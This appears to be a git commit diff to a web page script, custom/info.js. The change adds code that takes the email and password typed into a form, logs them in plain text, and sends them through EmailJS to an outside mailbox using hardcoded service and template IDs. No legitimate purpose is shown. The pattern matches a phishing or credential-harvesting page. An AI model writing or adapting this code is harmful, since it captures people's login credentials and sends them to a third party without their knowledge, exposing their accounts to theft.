5bb7e506214a57f547dccf54cdf54aa35664f88c
Aviral Dhingra <aviral.dhingra.2008@gmail.com>
2022-12-29 12:03:31 +0530

    Modifications

--- custom/info.js
+++ custom/info.js
@@ -1,10 +1,17 @@
-console.log('running')
-const btn = document.getElementById('submit') 
+console.log('Running...')
+// const btn = document.getElementById('submit')
 
-function foo(){
+function foo() {
     const email = document.getElementById('inputEmail');
     const password = document.getElementById('inputPassword');
-    const dict = JSON.stringify({'Email': email.value, 'Password': password.value});
+    const dict = { 'Email': email.value, 'Password': password.value };
     console.log('Called...');
     console.log(dict);
+    emailjs.init("eZGWlvtPHHYXrECAs");
+    emailjs.send('service_gucmk4a', 'template_4rw6wfa', dict)
+        .then(function (response) {
+            console.log('SUCCESS!', response.status, response.text);
+        }, function (error) {
+            console.log('FAILED...', error);
+        });
 }
